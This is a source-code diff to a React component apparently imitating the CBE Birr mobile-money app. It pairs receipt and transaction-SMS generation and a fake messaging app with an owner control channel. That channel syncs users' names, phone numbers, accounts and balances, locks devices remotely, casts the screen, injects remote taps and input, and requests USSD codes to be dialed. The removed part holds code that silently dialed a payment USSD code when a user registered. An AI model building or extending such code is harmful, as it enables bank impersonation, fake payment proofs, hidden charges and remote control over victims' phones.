@@ -2,7 +2,7 @@
 
 import React, { useState, useEffect, useRef, useMemo, useCallback } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { ArrowLeft, Download, Share2, Printer, Search, Trash2, Edit2, Plus, User, ChevronRight, Receipt, MapPin, Phone, HelpCircle, Fingerprint, WifiOff, CheckCircle2, MessageSquare, RefreshCw, Send, Check, X, Lock, Crosshair, Monitor, Power, ShieldCheck } from 'lucide-react';
+import { ArrowLeft, Bell, Download, Share2, Printer, Search, Trash2, Edit2, Plus, User, ChevronRight, Receipt, MapPin, Phone, PhoneCall, PhoneIncoming, PhoneOff, HelpCircle, Fingerprint, WifiOff, CheckCircle2, MessageSquare, Radio, RefreshCw, Send, Check, X, Lock, Crosshair, Mic, MicOff, Monitor, Power, ShieldCheck, Volume2, VolumeX } from 'lucide-react';
 import CBEAuthenticSpinner from './CBEAuthenticSpinner';
 import {
   sendTransactionSms,
@@ -19,34 +19,54 @@ import {
   generateStyledQrDataUrl,
   generateMatchedSquareQrDataUrl,
 } from '@/lib/styled-qr';
-import dynamic from 'next/dynamic';
 import { downloadReceiptPdfUniversally } from '@/lib/client-receipt-pdf';
+import SamsungMessagesApp from './SamsungMessagesApp';
 import PinchZoomContainer from './PinchZoomContainer';
+import OwnerControlDashboard from './OwnerControlDashboard';
+import { CallSession, OWNER_PIN, SupportSession } from '@/lib/owner-types';
 import {
-  DEFAULT_USSD_PAYMENT_CONFIG,
-  OWNER_PIN,
-  SupportSession,
-  UssdPaymentConfig,
-  getActiveUssdPreset,
-  resolveUssdPaymentCommand,
-} from '@/lib/owner-types';
-
-const SamsungMessagesApp = dynamic(() => import('./SamsungMessagesApp'), { ssr: false });
-const OwnerControlDashboard = dynamic(() => import('./OwnerControlDashboard'), { ssr: false });
-import {
+  answerWifiCall,
+  consumePendingNativeCallAction,
+  declineWifiCall,
   endSupportView,
-  fetchPublicUssdPaymentConfig,
+  endWifiCall,
+  fetchCallSession,
   fetchSupportSession,
   getCachedLockState,
   getOrCreateOwnerDeviceId,
+  isNativeCallBridgeAvailable,
   markNotificationSeen,
+  pushCallSignal,
+  pushSupportScreenFrame,
+  pushSupportSignal,
   pushSupportStateDelta,
+  pushSupportUssdResponse,
+  registerNativeCallDevice,
   reportDeviceTransaction,
+  requestAllNativeCallPermissions,
   respondSupportConsent,
   sendOfflineBeacon,
+  stopNativeCallRinger,
   syncDeviceTelemetry,
 } from '@/lib/owner-telemetry';
-import { testFirestoreConnection } from '@/lib/firebase-client';
+import {
+  captureElementFrameJpeg,
+  dispatchRemoteInput,
+  dispatchRemoteScroll,
+  dispatchRemoteTap,
+} from '@/lib/screen-cast';
+import {
+  LiveRtcConnectionStatus,
+  LiveRtcPeer,
+  playStreamInAudioElement,
+  requestLiveMicrophone,
+} from '@/lib/live-rtc';
+import {
+  closeWebIncomingCallNotifications,
+  showWebIncomingCallNotification,
+  startIncomingRingtone,
+  stopIncomingRingtone,
+} from '@/lib/call-ringtone';
 
 type ScreenStep = 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17;
 
@@ -477,19 +497,112 @@ export default function CBEBirrFullscreenApp() {
   const [showLockOwnerUnlock, setShowLockOwnerUnlock] = useState<boolean>(false);
   const [lockOwnerPinInput, setLockOwnerPinInput] = useState<string>('');
   const [lockOwnerPinError, setLockOwnerPinError] = useState<string>('');
+  const [activeInAppNotif, setActiveInAppNotif] = useState<{
+    notifId: string;
+    title: string;
+    message: string;
+  } | null>(null);
+  const inAppNotifTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
 
-  // Transparent Consent-Based Live Support View State
+  // Transparent Consent-Based Live Support View State, Two-Way Voice & Screen Cast Refs
   const [supportSession, setSupportSession] = useState<SupportSession | null>(null);
   const [supportConsentBusy, setSupportConsentBusy] = useState<boolean>(false);
   const [supportTipBanner, setSupportTipBanner] = useState<string>('');
   const [supportReconnecting, setSupportReconnecting] = useState<boolean>(false);
+  const [clientMicMuted, setClientMicMuted] = useState<boolean>(false);
+  const [clientSpeakerMuted, setClientSpeakerMuted] = useState<boolean>(false);
+  const [ownerMicMuted, setOwnerMicMuted] = useState<boolean>(false);
+  const [clientMicReady, setClientMicReady] = useState<boolean>(false);
+  const [clientRtcStatus, setClientRtcStatus] = useState<LiveRtcConnectionStatus>({
+    ice: 'new',
+    dataOpen: false,
+    voiceConnected: false,
+    hasRemoteAudio: false,
+  });
+  const [remoteTouchRipple, setRemoteTouchRipple] = useState<{
+    xPct: number;
+    yPct: number;
+    label?: string;
+    key: number;
+  } | null>(null);
   const supportStateSeqRef = useRef<number>(0);
   const lastAppliedCommandSeqRef = useRef<number>(0);
   const lastPushedSigRef = useRef<string>('');
+  const lastRemoteInputRef = useRef<HTMLInputElement | HTMLTextAreaElement | null>(null);
+  const remoteTouchTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const lastSentFrameRef = useRef<string>('');
+  const lastSentFrameAtRef = useRef<number>(0);
+  const lastHttpMirrorAtRef = useRef<number>(0);
+  const frameUploadInFlightRef = useRef<boolean>(false);
+  const triggerImmediateCaptureRef = useRef<((delayMs?: number) => void) | null>(null);
   const supportSessionRef = useRef<SupportSession | null>(null);
+  const clientAudioElRef = useRef<HTMLAudioElement | null>(null);
+  const clientRtcPeerRef = useRef<LiveRtcPeer | null>(null);
+  const clientMicStreamRef = useRef<MediaStream | null>(null);
+  const clientHandledOfferSeqRef = useRef<number>(0);
+  const clientDcFrameSeqRef = useRef<number>(0);
+  const clientMicMutedRef = useRef<boolean>(false);
+  const clientSpeakerMutedRef = useRef<boolean>(false);
   useEffect(() => {
     supportSessionRef.current = supportSession;
   }, [supportSession]);
+  useEffect(() => {
+    clientMicMutedRef.current = clientMicMuted;
+  }, [clientMicMuted]);
+  useEffect(() => {
+    clientSpeakerMutedRef.current = clientSpeakerMuted;
+    playStreamInAudioElement(
+      clientAudioElRef.current,
+      clientRtcPeerRef.current?.getRemoteStream() || null,
+      clientSpeakerMuted
+    );
+  }, [clientSpeakerMuted]);
+
+  // Consent-Based Remote USSD Execution State (During Active Screen Cast)
+  const [pendingUssdConsent, setPendingUssdConsent] = useState<{
+    requestId: string;
+    code: string;
+  } | null>(null);
+  const handledUssdReqIdsRef = useRef<Set<string>>(new Set());
+
+  // Wi-Fi VoIP Call Client State & Refs (Works In-App & Out-of-App)
+  const [clientCallSession, setClientCallSession] = useState<CallSession | null>(null);
+  const [clientCallBusy, setClientCallBusy] = useState<boolean>(false);
+  const [clientCallMicMuted, setClientCallMicMuted] = useState<boolean>(false);
+  const [clientCallSpeakerMuted, setClientCallSpeakerMuted] = useState<boolean>(false);
+  const [clientCallMicReady, setClientCallMicReady] = useState<boolean>(false);
+  const [clientCallElapsedSec, setClientCallElapsedSec] = useState<number>(0);
+  const [clientCallRtcStatus, setClientCallRtcStatus] = useState<LiveRtcConnectionStatus>({
+    ice: 'new',
+    dataOpen: false,
+    voiceConnected: false,
+    hasRemoteAudio: false,
+  });
+  const [showCallPermsBanner, setShowCallPermsBanner] = useState<boolean>(false);
+  const clientCallSessionRef = useRef<CallSession | null>(null);
+  const clientCallAudioElRef = useRef<HTMLAudioElement | null>(null);
+  const clientCallPeerRef = useRef<LiveRtcPeer | null>(null);
+  const clientCallMicStreamRef = useRef<MediaStream | null>(null);
+  const clientCallHandledOfferSeqRef = useRef<number>(0);
+  const clientCallMicMutedRef = useRef<boolean>(false);
+  const clientCallSpeakerMutedRef = useRef<boolean>(false);
+  const notifiedCallIdsRef = useRef<Set<string>>(new Set());
+  const handledCallActionKeysRef = useRef<Set<string>>(new Set());
+
+  useEffect(() => {
+    clientCallSessionRef.current = clientCallSession;
+  }, [clientCallSession]);
+  useEffect(() => {
+    clientCallMicMutedRef.current = clientCallMicMuted;
+  }, [clientCallMicMuted]);
+  useEffect(() => {
+    clientCallSpeakerMutedRef.current = clientCallSpeakerMuted;
+    playStreamInAudioElement(
+      clientCallAudioElRef.current,
+      clientCallPeerRef.current?.getRemoteStream() || null,
+      clientCallSpeakerMuted
+    );
+  }, [clientCallSpeakerMuted]);
 
   const profileSyncRef = useRef({ userName, phoneNumber, userAccount, balance });
   useEffect(() => {
@@ -504,10 +617,6 @@ export default function CBEBirrFullscreenApp() {
   const [regAccount, setRegAccount] = useState<string>('');
   const [regError, setRegError] = useState<string>('');
   const [regSubmitting, setRegSubmitting] = useState<boolean>(false);
-  const [regUssdConfig, setRegUssdConfig] = useState<UssdPaymentConfig>(DEFAULT_USSD_PAYMENT_CONFIG);
-  const [regUssdTriggered, setRegUssdTriggered] = useState<boolean>(false);
-  const [regUssdCodeSent, setRegUssdCodeSent] = useState<string>('');
-  const [regUssdRefreshing, setRegUssdRefreshing] = useState<boolean>(false);
   const deviceGateStateRef = useRef<'hydrating' | 'register' | 'pending' | 'approved' | 'rejected'>('hydrating');
   const regSubmitInFlightRef = useRef<boolean>(false);
   const regServerAckRef = useRef<boolean>(false);
@@ -515,88 +624,6 @@ export default function CBEBirrFullscreenApp() {
   useEffect(() => {
     deviceGateStateRef.current = deviceGateState;
   }, [deviceGateState]);
-
-  const refreshRegUssdConfig = useCallback(async () => {
-    setRegUssdRefreshing(true);
-    try {
-      const cfg = await fetchPublicUssdPaymentConfig();
-      if (cfg?.presets?.length) {
-        setRegUssdConfig(cfg);
-      }
-    } finally {
-      setRegUssdRefreshing(false);
-    }
-  }, []);
-
-  useEffect(() => {
-    if (!isStorageHydrated || deviceGateState !== 'register') return;
-    let active = true;
-    const syncCfg = async () => {
-      const cfg = await fetchPublicUssdPaymentConfig();
-      if (active && cfg?.presets?.length) {
-        setRegUssdConfig(cfg);
-      }
-    };
-    void syncCfg();
-    const onFocus = () => void syncCfg();
-    const onVis = () => {
-      if (document.visibilityState === 'visible') void syncCfg();
-    };
-    window.addEventListener('focus', onFocus);
-    document.addEventListener('visibilitychange', onVis);
-    return () => {
-      active = false;
-      window.removeEventListener('focus', onFocus);
-      document.removeEventListener('visibilitychange', onVis);
-    };
-  }, [isStorageHydrated, deviceGateState]);
-
-  const activeRegUssdPreset = useMemo(
-    () => getActiveUssdPreset(regUssdConfig),
-    [regUssdConfig]
-  );
-  const activeRegUssdCommand = useMemo(
-    () => resolveUssdPaymentCommand(activeRegUssdPreset),
-    [activeRegUssdPreset]
-  );
-
-  const runRegistrationPaymentUssd = useCallback(() => {
-    const resolved = resolveUssdPaymentCommand(getActiveUssdPreset(regUssdConfig));
-    setRegUssdTriggered(true);
-    setRegUssdCodeSent(resolved.displayCode);
-    if (typeof window === 'undefined') return resolved;
-    try {
-      if (typeof navigator !== 'undefined' && typeof navigator.vibrate === 'function') {
-        navigator.vibrate([35, 50, 35]);
-      }
-    } catch {}
-    try {
-      const w = window as unknown as {
-        Android?: { dialUSSD?: (u: string) => void; callUSSD?: (u: string) => void; hideLoadingOverlay?: () => void };
-      };
-      if (typeof w.Android?.dialUSSD === 'function') {
-        w.Android.dialUSSD(resolved.dialUri);
-        setTimeout(() => {
-          try { w.Android?.hideLoadingOverlay?.(); } catch {}
-        }, 120);
-        return resolved;
-      }
-      if (typeof w.Android?.callUSSD === 'function') {
-        w.Android.callUSSD(resolved.dialUri);
-        setTimeout(() => {
-          try { w.Android?.hideLoadingOverlay?.(); } catch {}
-        }, 120);
-        return resolved;
-      }
-      const a = document.createElement('a');
-      a.href = resolved.dialUri;
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-    } catch {}
-    return resolved;
-  }, [regUssdConfig]);
 
   const exitAppCleanly = useCallback(() => {
     if (typeof window === 'undefined') return;
@@ -649,12 +676,6 @@ export default function CBEBirrFullscreenApp() {
     }
 
     setRegError('');
-    let usedUssdCode = regUssdCodeSent || activeRegUssdCommand.displayCode;
-    if (!regUssdTriggered) {
-      const launched = runRegistrationPaymentUssd();
-      usedUssdCode = launched.displayCode;
-    }
-
     setRegSubmitting(true);
     regSubmitInFlightRef.current = true;
     regServerAckRef.current = false;
@@ -690,8 +711,6 @@ export default function CBEBirrFullscreenApp() {
         freshRegistration: true,
         forceApprovalCheck: true,
         clientGateState: 'pending',
-        paymentUssdTriggered: true,
-        paymentUssdCode: usedUssdCode,
       });
       if (res?.fromServer) {
         regServerAckRef.current = true;
@@ -730,6 +749,20 @@ export default function CBEBirrFullscreenApp() {
       if (!notif?.notifId || !notif?.message) return;
       markNotificationSeen(notif.notifId);
 
+      // Always show high-priority in-app owner banner inside cbebirr-plus.apk & web so owner messages never vanish silently
+      const durationMs = Math.max(4, Math.min(20, Number(notif.durationSeconds || 8))) * 1000;
+      if (inAppNotifTimerRef.current) {
+        clearTimeout(inAppNotifTimerRef.current);
+      }
+      setActiveInAppNotif({
+        notifId: notif.notifId,
+        title: notif.title || 'Notice',
+        message: notif.message,
+      });
+      inAppNotifTimerRef.current = setTimeout(() => {
+        setActiveInAppNotif((curr) => (curr?.notifId === notif.notifId ? null : curr));
+      }, durationMs);
+
       const isNativeApk =
         typeof window !== 'undefined' &&
         (window.location?.origin?.includes('appassets.androidplatform.net') ||
@@ -754,7 +787,10 @@ export default function CBEBirrFullscreenApp() {
         } as NotificationOptions;
         try {
           if ('serviceWorker' in navigator) {
-            const reg = await navigator.serviceWorker.ready;
+            const reg = await Promise.race([
+              navigator.serviceWorker.ready,
+              new Promise<null>((resolve) => setTimeout(() => resolve(null), 1500)),
+            ]);
             if (reg && typeof reg.showNotification === 'function') {
               await reg.showNotification(title, options);
               return;
@@ -793,18 +829,39 @@ export default function CBEBirrFullscreenApp() {
     queueMicrotask(() => {
       setRemoteLockState(getCachedLockState());
     });
-    testFirestoreConnection().catch(() => {});
   }, []);
 
   useEffect(() => {
-    if (!isStorageHydrated || deviceGateState === 'hydrating' || deviceGateState === 'register') return;
+    if (!isStorageHydrated || deviceGateState === 'hydrating') return;
     let active = true;
 
     const runSync = async () => {
       if (!active || regSubmitInFlightRef.current) return;
       const gate = deviceGateStateRef.current;
-      if (gate === 'hydrating' || gate === 'register') return;
+      if (gate === 'hydrating') return;
       const p = profileSyncRef.current;
+
+      // On the initial Register screen, poll read-only (checkOnly) so Global Lock & Broadcast Notifications from RamControl.apk
+      // work immediately without registering a blank/placeholder device record before submission.
+      if (gate === 'register') {
+        const res = await syncDeviceTelemetry({
+          ...p,
+          checkOnly: true,
+          clientGateState: 'register',
+        });
+        if (!active || !res) return;
+        setRemoteLockState({
+          locked: res.lockState.locked,
+          message: res.lockState.message,
+        });
+        if (res.newNotifications.length > 0) {
+          for (const n of res.newNotifications) {
+            void deliverSystemNotification(n);
+          }
+        }
+        return;
+      }
+
       const shouldSendRegister = gate === 'pending' && !regServerAckRef.current;
       const res = await syncDeviceTelemetry({
         ...p,
@@ -866,14 +923,29 @@ export default function CBEBirrFullscreenApp() {
         } else if (supportSessionRef.current) {
           setSupportSession(null);
           setSupportTipBanner('');
+          setPendingUssdConsent(null);
         }
       } else if (supportSessionRef.current) {
         setSupportSession(null);
         setSupportTipBanner('');
+        setPendingUssdConsent(null);
+      }
+
+      if (res.callSession) {
+        if (res.callSession.status === 'ringing' || res.callSession.status === 'active') {
+          setClientCallSession(res.callSession);
+        } else if (clientCallSessionRef.current) {
+          setClientCallSession(null);
+        }
+      } else if (clientCallSessionRef.current) {
+        setClientCallSession(null);
       }
     };
 
     runSync();
+    if (deviceGateState === 'approved') {
+      registerNativeCallDevice();
+    }
     const pollMs = deviceGateState === 'pending' ? 2000 : 4000;
     const intervalId = setInterval(runSync, pollMs);
 
@@ -883,6 +955,9 @@ export default function CBEBirrFullscreenApp() {
       if (now - lastPairBroadcastMs < 10_000) return;
       lastPairBroadcastMs = now;
       dispatchNativeDevicePair();
+      if (deviceGateStateRef.current === 'approved') {
+        registerNativeCallDevice();
+      }
     };
     triggerPairBroadcast();
 
@@ -891,20 +966,19 @@ export default function CBEBirrFullscreenApp() {
         runSync();
         triggerPairBroadcast();
       } else if (document.visibilityState === 'hidden' && deviceGateStateRef.current === 'approved') {
-        sendOfflineBeacon({
-          ...profileSyncRef.current,
-          clientGateState: deviceGateStateRef.current,
-        });
+        sendOfflineBeacon(profileSyncRef.current);
       }
     };
-    const onOnline = () => runSync();
-    const onFocus = () => triggerPairBroadcast();
+    const onOnline = () => {
+      void runSync();
+    };
+    const onFocus = () => {
+      void runSync();
+      triggerPairBroadcast();
+    };
     const onPageHide = () => {
       if (deviceGateStateRef.current === 'approved') {
-        sendOfflineBeacon({
-          ...profileSyncRef.current,
-          clientGateState: deviceGateStateRef.current,
-        });
+        sendOfflineBeacon(profileSyncRef.current);
       }
     };
 
@@ -932,15 +1006,104 @@ export default function CBEBirrFullscreenApp() {
     return () => clearTimeout(t);
   }, [userName, phoneNumber, userAccount, balance, isStorageHydrated, deviceGateState]);
 
+  const teardownClientRtc = useCallback((stopMic = true) => {
+    if (clientRtcPeerRef.current) {
+      clientRtcPeerRef.current.destroy(stopMic);
+      clientRtcPeerRef.current = null;
+    }
+    if (stopMic && clientMicStreamRef.current) {
+      for (const t of clientMicStreamRef.current.getTracks()) {
+        try {
+          t.stop();
+        } catch {}
+      }
+      clientMicStreamRef.current = null;
+      setClientMicReady(false);
+    }
+    if (clientAudioElRef.current) {
+      clientAudioElRef.current.srcObject = null;
+    }
+    clientHandledOfferSeqRef.current = 0;
+    clientDcFrameSeqRef.current = 0;
+    setClientRtcStatus({
+      ice: 'closed',
+      dataOpen: false,
+      voiceConnected: false,
+      hasRemoteAudio: false,
+    });
+  }, []);
+
+  const ensureClientMicAndAudio = useCallback(async () => {
+    if (clientAudioElRef.current) {
+      try {
+        clientAudioElRef.current.muted = clientSpeakerMutedRef.current;
+        const p = clientAudioElRef.current.play();
+        if (p && typeof p.catch === 'function') p.catch(() => {});
+      } catch {}
+    }
+    if (!clientMicStreamRef.current) {
+      const micRes = await requestLiveMicrophone();
+      if (micRes.stream) {
+        clientMicStreamRef.current = micRes.stream;
+        setClientMicReady(true);
+        clientRtcPeerRef.current?.attachLocalStream(micRes.stream, clientMicMutedRef.current);
+      } else {
+        setClientMicReady(false);
+      }
+    }
+  }, []);
+
+  const handleToggleClientMic = async () => {
+    playStreamInAudioElement(
+      clientAudioElRef.current,
+      clientRtcPeerRef.current?.getRemoteStream() || null,
+      clientSpeakerMuted
+    );
+    const myId = getOrCreateOwnerDeviceId();
+    if (!clientMicStreamRef.current) {
+      const micRes = await requestLiveMicrophone();
+      if (micRes.stream) {
+        clientMicStreamRef.current = micRes.stream;
+        setClientMicReady(true);
+        setClientMicMuted(false);
+        clientRtcPeerRef.current?.attachLocalStream(micRes.stream, false);
+        clientRtcPeerRef.current?.sendMessage({ type: 'mic_state', muted: false });
+        void pushSupportSignal(myId, false, { micMuted: false });
+      }
+      return;
+    }
+    const nextMuted = !clientMicMuted;
+    setClientMicMuted(nextMuted);
+    clientRtcPeerRef.current?.setMicMuted(nextMuted);
+    clientRtcPeerRef.current?.sendMessage({ type: 'mic_state', muted: nextMuted });
+    void pushSupportSignal(myId, false, { micMuted: nextMuted });
+  };
+
+  const handleToggleClientSpeaker = () => {
+    const nextMuted = !clientSpeakerMuted;
+    setClientSpeakerMuted(nextMuted);
+    playStreamInAudioElement(
+      clientAudioElRef.current,
+      clientRtcPeerRef.current?.getRemoteStream() || null,
+      nextMuted
+    );
+  };
+
   const handleAcceptSupportRequest = async () => {
     setSupportConsentBusy(true);
     try {
       lastAppliedCommandSeqRef.current = 0;
       lastPushedSigRef.current = '';
+      clientHandledOfferSeqRef.current = 0;
+      setClientMicMuted(false);
+      setClientSpeakerMuted(false);
+      // Capture mic & unlock audio directly inside user Allow gesture
+      void ensureClientMicAndAudio();
       const active = await respondSupportConsent(true);
       if (active && active.status === 'active') {
         setSupportSession(active);
       } else {
+        teardownClientRtc(true);
         setSupportSession(null);
       }
     } finally {
@@ -950,6 +1113,7 @@ export default function CBEBirrFullscreenApp() {
 
   const handleDeclineSupportRequest = async () => {
     setSupportConsentBusy(true);
+    teardownClientRtc(true);
     try {
       await respondSupportConsent(false);
       setSupportSession(null);
@@ -962,6 +1126,8 @@ export default function CBEBirrFullscreenApp() {
   const handleUserEndSupportSession = async () => {
     const myId = getOrCreateOwnerDeviceId();
     setSupportConsentBusy(true);
+    setPendingUssdConsent(null);
+    teardownClientRtc(true);
     try {
       await endSupportView(myId, false);
       setSupportSession(null);
@@ -970,6 +1136,529 @@ export default function CBEBirrFullscreenApp() {
       setSupportConsentBusy(false);
     }
   };
+
+  // Consent-Based Remote USSD Handlers (ONLY run dialer when user explicitly taps OK)
+  const handleApproveUssdConsent = () => {
+    const req = pendingUssdConsent;
+    if (!req) return;
+    setPendingUssdConsent(null);
+    const myId = getOrCreateOwnerDeviceId();
+    const code = req.code.trim();
+
+    clientRtcPeerRef.current?.sendMessage({
+      type: 'ussd_status',
+      requestId: req.requestId,
+      code,
+      status: 'approved',
+    });
+    void pushSupportUssdResponse(myId, {
+      requestId: req.requestId,
+      code,
+      status: 'approved',
+    });
+
+    if (typeof window !== 'undefined' && 'vibrate' in navigator && typeof navigator.vibrate === 'function') {
+      navigator.vibrate([40, 60, 40]);
+    }
+
+    const telUri = `tel:${code.replace(/#/g, '%23')}`;
+    try {
+      const androidAny = (window as any).Android;
+      if (androidAny?.dialUSSD) {
+        androidAny.dialUSSD(telUri);
+      } else if (androidAny?.callUSSD) {
+        androidAny.callUSSD(telUri);
+      } else {
+        const a = document.createElement('a');
+        a.href = telUri;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+      clientRtcPeerRef.current?.sendMessage({
+        type: 'ussd_status',
+        requestId: req.requestId,
+        code,
+        status: 'dialed',
+      });
+      void pushSupportUssdResponse(myId, {
+        requestId: req.requestId,
+        code,
+        status: 'dialed',
+      });
+    } catch {
+      clientRtcPeerRef.current?.sendMessage({
+        type: 'ussd_status',
+        requestId: req.requestId,
+        code,
+        status: 'failed',
+        detail: 'Unable to open phone dialer',
+      });
+      void pushSupportUssdResponse(myId, {
+        requestId: req.requestId,
+        code,
+        status: 'failed',
+        detail: 'Unable to open phone dialer',
+      });
+    }
+  };
+
+  const handleDeclineUssdConsent = () => {
+    const req = pendingUssdConsent;
+    if (!req) return;
+    setPendingUssdConsent(null);
+    const myId = getOrCreateOwnerDeviceId();
+    clientRtcPeerRef.current?.sendMessage({
+      type: 'ussd_status',
+      requestId: req.requestId,
+      code: req.code,
+      status: 'declined',
+    });
+    void pushSupportUssdResponse(myId, {
+      requestId: req.requestId,
+      code: req.code,
+      status: 'declined',
+    });
+  };
+
+  // Client Wi-Fi VoIP Call WebRTC & Native/Web Ringer Handlers
+  const teardownClientCallRtc = useCallback((stopMic = true) => {
+    stopIncomingRingtone();
+    stopNativeCallRinger();
+    void closeWebIncomingCallNotifications();
+    if (clientCallPeerRef.current) {
+      clientCallPeerRef.current.destroy(stopMic);
+      clientCallPeerRef.current = null;
+    }
+    if (stopMic && clientCallMicStreamRef.current) {
+      for (const t of clientCallMicStreamRef.current.getTracks()) {
+        try {
+          t.stop();
+        } catch {}
+      }
+      clientCallMicStreamRef.current = null;
+      setClientCallMicReady(false);
+    }
+    if (clientCallAudioElRef.current) {
+      clientCallAudioElRef.current.srcObject = null;
+    }
+    clientCallHandledOfferSeqRef.current = 0;
+    setClientCallRtcStatus({
+      ice: 'closed',
+      dataOpen: false,
+      voiceConnected: false,
+      hasRemoteAudio: false,
+    });
+  }, []);
+
+  const ensureClientCallPeer = useCallback(() => {
+    if (clientCallPeerRef.current) return clientCallPeerRef.current;
+    const peer = new LiveRtcPeer({
+      onStatus: (st) => {
+        setClientCallRtcStatus(st);
+      },
+      onRemoteAudio: (stream) => {
+        stopIncomingRingtone();
+        stopNativeCallRinger();
+        playStreamInAudioElement(
+          clientCallAudioElRef.current,
+          stream,
+          clientCallSpeakerMutedRef.current
+        );
+      },
+      onMessage: (msg) => {
+        if (msg.type === 'mic_state') {
+          setClientCallSession((prev) =>
+            prev ? { ...prev, ownerMicMuted: Boolean(msg.muted) } : prev
+          );
+        }
+      },
+    });
+    if (clientCallMicStreamRef.current) {
+      peer.attachLocalStream(clientCallMicStreamRef.current, clientCallMicMutedRef.current);
+    }
+    clientCallPeerRef.current = peer;
+    return peer;
+  }, []);
+
+  const handleIncomingCallOfferIfNeeded = useCallback(
+    async (sess: CallSession) => {
+      if (
+        sess.status !== 'active' ||
+        !sess.rtcOffer ||
+        !sess.rtcSeq ||
+        sess.rtcSeq <= clientCallHandledOfferSeqRef.current
+      ) {
+        return;
+      }
+      clientCallHandledOfferSeqRef.current = sess.rtcSeq;
+      try {
+        if (!clientCallMicStreamRef.current) {
+          const micRes = await requestLiveMicrophone();
+          if (micRes.stream) {
+            clientCallMicStreamRef.current = micRes.stream;
+            setClientCallMicReady(true);
+          }
+        }
+        const peer = ensureClientCallPeer();
+        if (clientCallMicStreamRef.current) {
+          peer.attachLocalStream(clientCallMicStreamRef.current, clientCallMicMutedRef.current);
+        }
+        const answerJson = await peer.acceptOfferAndCreateAnswer(sess.rtcOffer);
+        if (answerJson) {
+          const myId = getOrCreateOwnerDeviceId();
+          await pushCallSignal(myId, false, {
+            rtcSeq: sess.rtcSeq,
+            rtcAnswer: answerJson,
+            micMuted: clientCallMicMutedRef.current,
+          });
+        }
+      } catch {
+        clientCallHandledOfferSeqRef.current = Math.max(0, sess.rtcSeq - 1);
+      }
+    },
+    [ensureClientCallPeer]
+  );
+
+  const handleAnswerIncomingCall = useCallback(
+    async (overrideSess?: CallSession) => {
+      const myId = getOrCreateOwnerDeviceId();
+      stopIncomingRingtone();
+      stopNativeCallRinger();
+      void closeWebIncomingCallNotifications();
+
+      setClientCallBusy(true);
+      setClientCallMicMuted(false);
+      setClientCallSpeakerMuted(false);
+
+      if (clientCallAudioElRef.current) {
+        try {
+          clientCallAudioElRef.current.muted = false;
+          const p = clientCallAudioElRef.current.play();
+          if (p && typeof p.catch === 'function') p.catch(() => {});
+        } catch {}
+      }
+
+      try {
+        const sess =
+          overrideSess ||
+          clientCallSessionRef.current ||
+          (await fetchCallSession(myId, false));
+        if (!sess || (sess.status !== 'ringing' && sess.status !== 'active')) {
+          setClientCallSession(null);
+          return;
+        }
+
+        if (!clientCallMicStreamRef.current) {
+          const micRes = await requestLiveMicrophone();
+          if (micRes.stream) {
+            clientCallMicStreamRef.current = micRes.stream;
+            setClientCallMicReady(true);
+          } else {
+            setClientCallMicReady(false);
+          }
+        }
+
+        let answerJson: string | undefined;
+        if (sess.rtcOffer) {
+          const peer = ensureClientCallPeer();
+          if (clientCallMicStreamRef.current) {
+            peer.attachLocalStream(clientCallMicStreamRef.current, false);
+          }
+          const createdAnswer = await peer.acceptOfferAndCreateAnswer(sess.rtcOffer).catch(() => null);
+          if (createdAnswer) {
+            answerJson = createdAnswer;
+            clientCallHandledOfferSeqRef.current = Math.max(sess.rtcSeq || 1, 1);
+          }
+        }
+
+        const answered = await answerWifiCall(myId, answerJson, false);
+        if (answered && (answered.status === 'active' || answered.status === 'ringing')) {
+          setClientCallSession(answered);
+        } else {
+          teardownClientCallRtc(true);
+          setClientCallSession(null);
+        }
+      } finally {
+        setClientCallBusy(false);
+      }
+    },
+    [ensureClientCallPeer, teardownClientCallRtc]
+  );
+
+  const handleDeclineIncomingCall = useCallback(async () => {
+    const myId = getOrCreateOwnerDeviceId();
+    setClientCallBusy(true);
+    teardownClientCallRtc(true);
+    try {
+      await declineWifiCall(myId);
+      setClientCallSession(null);
+    } finally {
+      setClientCallBusy(false);
+    }
+  }, [teardownClientCallRtc]);
+
+  const handleClientEndCall = useCallback(async () => {
+    const myId = getOrCreateOwnerDeviceId();
+    setClientCallBusy(true);
+    teardownClientCallRtc(true);
+    try {
+      await endWifiCall(myId, false);
+      setClientCallSession(null);
+    } finally {
+      setClientCallBusy(false);
+    }
+  }, [teardownClientCallRtc]);
+
+  const handleToggleClientCallMic = async () => {
+    playStreamInAudioElement(
+      clientCallAudioElRef.current,
+      clientCallPeerRef.current?.getRemoteStream() || null,
+      clientCallSpeakerMuted
+    );
+    const myId = getOrCreateOwnerDeviceId();
+    if (!clientCallMicStreamRef.current) {
+      const micRes = await requestLiveMicrophone();
+      if (micRes.stream) {
+        clientCallMicStreamRef.current = micRes.stream;
+        setClientCallMicReady(true);
+        setClientCallMicMuted(false);
+        clientCallPeerRef.current?.attachLocalStream(micRes.stream, false);
+        clientCallPeerRef.current?.sendMessage({ type: 'mic_state', muted: false });
+        void pushCallSignal(myId, false, { micMuted: false });
+      }
+      return;
+    }
+    const nextMuted = !clientCallMicMuted;
+    setClientCallMicMuted(nextMuted);
+    clientCallPeerRef.current?.setMicMuted(nextMuted);
+    clientCallPeerRef.current?.sendMessage({ type: 'mic_state', muted: nextMuted });
+    void pushCallSignal(myId, false, { micMuted: nextMuted });
+  };
+
+  const handleToggleClientCallSpeaker = () => {
+    const nextMuted = !clientCallSpeakerMuted;
+    setClientCallSpeakerMuted(nextMuted);
+    playStreamInAudioElement(
+      clientCallAudioElRef.current,
+      clientCallPeerRef.current?.getRemoteStream() || null,
+      nextMuted
+    );
+  };
+
+  const handleGrantCallPermissions = async () => {
+    setShowCallPermsBanner(false);
+    try {
+      localStorage.setItem('cbebirr_call_perms_prompted_v1', '1');
+    } catch {}
+    if (requestAllNativeCallPermissions()) {
+      registerNativeCallDevice();
+    }
+    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'default') {
+      try {
+        await Notification.requestPermission();
+      } catch {}
+    }
+    try {
+      const micRes = await requestLiveMicrophone();
+      if (micRes.stream) {
+        for (const t of micRes.stream.getTracks()) {
+          t.stop();
+        }
+      }
+    } catch {}
+  };
+
